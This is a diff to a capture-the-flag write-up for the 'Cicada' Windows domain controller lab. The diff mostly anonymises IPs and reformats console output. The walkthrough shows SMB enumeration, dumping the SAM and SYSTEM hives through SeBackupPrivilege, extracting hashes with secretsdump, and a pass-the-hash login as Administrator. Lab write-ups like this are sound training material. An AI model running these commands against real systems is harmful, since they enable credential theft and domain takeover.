@@ -10,11 +10,11 @@
 
 | Field | Value |
 |---|---|
-| Target IP | `10.129.20.124` |
+| Target IP | `<DC_IP>` |
 | Hostname | `CICADA-DC.cicada.htb` |
 | Operating System | Windows Server 2022 Build 20348 |
 | Difficulty | Easy |
-| Attacker IP | `10.10.16.27` (tun0) |
+| Attacker IP | `<ATTACKER_IP>` (tun0) |
 
 ---
 
@@ -70,7 +70,7 @@ Key observations:
 Add both names to `/etc/hosts` before proceeding — SMB auth with domain accounts, Evil-WinRM, and BloodHound collection all require this:
 
 ```bash
-echo '10.129.20.124 cicada.htb CICADA-DC.cicada.htb' | sudo tee -a /etc/hosts
+echo '<DC_IP> cicada.htb CICADA-DC.cicada.htb' | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -87,8 +87,8 @@ nxc smb cicada.htb -u "" -p "" --shares
 
 ```
 # Console Output
-SMB  10.129.20.124  445  CICADA-DC  [+] cicada.htb\:
-SMB  10.129.20.124  445  CICADA-DC  [-] Error enumerating shares: STATUS_ACCESS_DENIED
+SMB  <DC_IP>  445  CICADA-DC  [+] cicada.htb\:
+SMB  <DC_IP>  445  CICADA-DC  [-] Error enumerating shares: STATUS_ACCESS_DENIED
 ```
 
 The built-in `guest` account (no password) gets further — and the `HR` share is readable:
@@ -99,16 +99,16 @@ nxc smb cicada.htb -u "guest" -p "" --shares
 
 ```
 # Console Output
-SMB  10.129.20.124  445  CICADA-DC  [+] cicada.htb\guest:
-SMB  10.129.20.124  445  CICADA-DC  Share        Permissions  Remark
-SMB  10.129.20.124  445  CICADA-DC  -----        -----------  ------
-SMB  10.129.20.124  445  CICADA-DC  ADMIN$                    Remote Admin
-SMB  10.129.20.124  445  CICADA-DC  C$                        Default share
-SMB  10.129.20.124  445  CICADA-DC  DEV
-SMB  10.129.20.124  445  CICADA-DC  HR           READ
-SMB  10.129.20.124  445  CICADA-DC  IPC$         READ          Remote IPC
-SMB  10.129.20.124  445  CICADA-DC  NETLOGON                  Logon server share
-SMB  10.129.20.124  445  CICADA-DC  SYSVOL                    Logon server share
+SMB  <DC_IP>  445  CICADA-DC  [+] cicada.htb\guest:
+SMB  <DC_IP>  445  CICADA-DC  Share        Permissions  Remark
+SMB  <DC_IP>  445  CICADA-DC  -----        -----------  ------
+SMB  <DC_IP>  445  CICADA-DC  ADMIN$                    Remote Admin
+SMB  <DC_IP>  445  CICADA-DC  C$                        Default share
+SMB  <DC_IP>  445  CICADA-DC  DEV
+SMB  <DC_IP>  445  CICADA-DC  HR           READ
+SMB  <DC_IP>  445  CICADA-DC  IPC$         READ          Remote IPC
+SMB  <DC_IP>  445  CICADA-DC  NETLOGON                  Logon server share
+SMB  <DC_IP>  445  CICADA-DC  SYSVOL                    Logon server share
 ```
 
 `DEV` has no permissions listed under guest — we'll need a domain account to reach it.
@@ -220,7 +220,7 @@ nxc winrm cicada.htb -u michael.wrightson -p '<PASSWORD REDACTED>'
 
 ```bash
 nxc ldap CICADA-DC.cicada.htb -u michael.wrightson -p '<PASSWORD REDACTED>' \
-    --bloodhound -c All --dns-server 10.129.20.124
+    --bloodhound -c All --dns-server <DC_IP>
 ```
 
 ```
@@ -242,7 +242,7 @@ The nmap SSL cert issuer flagged an internal CA. We enumerate it with `certipy`:
 
 ```bash
 certipy find -u michael.wrightson -p '<PASSWORD REDACTED>' \
-    -dc-ip 10.129.20.124 -text -enabled -hide-admins -vulnerable
+    -dc-ip <DC_IP> -text -enabled -hide-admins -vulnerable
 ```
 
 ```
@@ -301,11 +301,11 @@ nxc smb CICADA-DC.cicada.htb -u david.orelious -p '<PASSWORD REDACTED>' --shares
 
 ```
 # Console Output
-SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\david.orelious:<PASSWORD REDACTED>
-SMB  10.129.231.149  445  CICADA-DC  DEV          READ
-SMB  10.129.231.149  445  CICADA-DC  HR           READ
-SMB  10.129.231.149  445  CICADA-DC  NETLOGON     READ
-SMB  10.129.231.149  445  CICADA-DC  SYSVOL       READ
+SMB  <DC_IP>  445  CICADA-DC  [+] cicada.htb\david.orelious:<PASSWORD REDACTED>
+SMB  <DC_IP>  445  CICADA-DC  DEV          READ
+SMB  <DC_IP>  445  CICADA-DC  HR           READ
+SMB  <DC_IP>  445  CICADA-DC  NETLOGON     READ
+SMB  <DC_IP>  445  CICADA-DC  SYSVOL       READ
 ```
 
 `david.orelious` can now read `DEV`.
@@ -354,12 +354,12 @@ nxc smb CICADA-DC.cicada.htb -u emily.oscars -p '<PASSWORD REDACTED>' --shares
 
 ```
 # Console Output
-SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\emily.oscars:<PASSWORD REDACTED>
-SMB  10.129.231.149  445  CICADA-DC  ADMIN$       READ
-SMB  10.129.231.149  445  CICADA-DC  C$           READ,WRITE
-SMB  10.129.231.149  445  CICADA-DC  HR           READ
-SMB  10.129.231.149  445  CICADA-DC  NETLOGON     READ
-SMB  10.129.231.149  445  CICADA-DC  SYSVOL       READ
+SMB  <DC_IP>  445  CICADA-DC  [+] cicada.htb\emily.oscars:<PASSWORD REDACTED>
+SMB  <DC_IP>  445  CICADA-DC  ADMIN$       READ
+SMB  <DC_IP>  445  CICADA-DC  C$           READ,WRITE
+SMB  <DC_IP>  445  CICADA-DC  HR           READ
+SMB  <DC_IP>  445  CICADA-DC  NETLOGON     READ
+SMB  <DC_IP>  445  CICADA-DC  SYSVOL       READ
 ```
 
 `emily.oscars` has `READ,WRITE` on `C$` and `READ` on `ADMIN$` — near-admin SMB access. WinRM confirms a shell is available:
@@ -374,12 +374,21 @@ nxc winrm cicada.htb -u emily.oscars -p '<PASSWORD REDACTED>'
 ```
 
 ```bash
-evil-winrm -i 10.129.231.149 -u emily.oscars -p '<PASSWORD REDACTED>'
+evil-winrm -i <DC_IP> -u emily.oscars -p '<PASSWORD REDACTED>'
 ```
 
 ```
 # Console Output
-*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
+```
+
+```
+whoami
+```
+
+```
+# Console Output
 cicada\emily.oscars
 ```
 
@@ -388,8 +397,11 @@ Grab the user flag from the desktop before moving on.
 ### SeBackupPrivilege Confirmed
 
 ```
-*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
+whoami /priv
+```
 
+```
+# Console Output
 Privilege Name                Description                    State
 ============================= ============================== =======
 SeBackupPrivilege             Back up files and directories  Enabled
@@ -412,24 +424,34 @@ BloodHound confirms the source: `emily.oscars` is a member of the **Backup Opera
 `reg save` honours `SeBackupPrivilege` — the export bypasses the ACL that normally restricts these keys to SYSTEM:
 
 ```
-*Evil-WinRM* PS C:\windows\temp> reg save HKLM\SAM C:\Windows\Temp\sam
-The operation completed successfully.
+reg save HKLM\SAM C:\Windows\Temp\sam
+```
 
-*Evil-WinRM* PS C:\windows\temp> reg save HKLM\SYSTEM C:\Windows\Temp\system
+```
+# Console Output
+The operation completed successfully.
+```
+
+```
+reg save HKLM\SYSTEM C:\Windows\Temp\system
+```
+
+```
+# Console Output
 The operation completed successfully.
 ```
 
 Download both to the attacking machine using Evil-WinRM's built-in transfer:
 
 ```
-*Evil-WinRM* PS C:\windows\temp> download C:\Windows\Temp\sam
-*Evil-WinRM* PS C:\windows\temp> download C:\Windows\Temp\system
+download C:\Windows\Temp\sam
+download C:\Windows\Temp\system
 ```
 
 ### Extracting Hashes — secretsdump
 
 ```bash
-secretsdump.py -sam sam -system system -security security LOCAL
+secretsdump.py -sam sam -system system LOCAL
 ```
 
 ```
@@ -438,6 +460,9 @@ secretsdump.py -sam sam -system system -security security LOCAL
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Cleaning up...
 ```
 
 ### Pass-the-Hash — Administrator
@@ -445,12 +470,21 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
 No cracking required. We authenticate directly with the NT hash using Evil-WinRM's `-H` flag:
 
 ```bash
-evil-winrm -i 10.129.231.149 -u Administrator -H '<HASH REDACTED>'
+evil-winrm -i <DC_IP> -u Administrator -H '<HASH REDACTED>'
 ```
 
 ```
 # Console Output
-*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+```
+whoami
+```
+
+```
+# Console Output
 cicada\administrator
 ```
 
@@ -460,7 +494,7 @@ Full domain compromise. Root flag on the Administrator's desktop.
 
 > **Alternative — NetExec `backup_operator` module:** Automates the hive extraction without dropping into a shell first:
 > ```bash
-> nxc smb 10.129.231.149 -u emily.oscars -p '<PASSWORD REDACTED>' -M backup_operator
+> nxc smb <DC_IP> -u emily.oscars -p '<PASSWORD REDACTED>' -M backup_operator
 > ```
 > Requires the same Backup Operators membership. Replaces the manual `reg save` + download steps.
 
